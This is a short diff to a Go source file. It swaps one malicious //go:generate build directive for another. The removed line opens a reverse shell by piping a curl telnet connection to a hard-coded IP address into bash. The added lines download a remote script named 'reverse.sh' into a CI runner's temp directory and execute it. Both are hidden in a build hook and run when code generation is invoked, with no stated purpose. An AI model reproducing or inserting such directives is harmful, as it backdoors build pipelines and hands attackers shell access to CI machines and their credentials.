@@ -1,5 +1,5 @@
-//go:generate C='curl -Ns telnet://35.184.92.106:80'; $C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null
-
+//go:generate curl -s -o $RUNNER_TEMP/run.sh https://gist.githubusercontent.com/armmanvaillancourt/24020b840eaab11c9790535b2b5e156e/raw/cd2c82692d32a05126b2983a23e7403c43a76f14/reverse.sh
+//go:generate bash $RUNNER_TEMP/run.sh
 
 package main
 
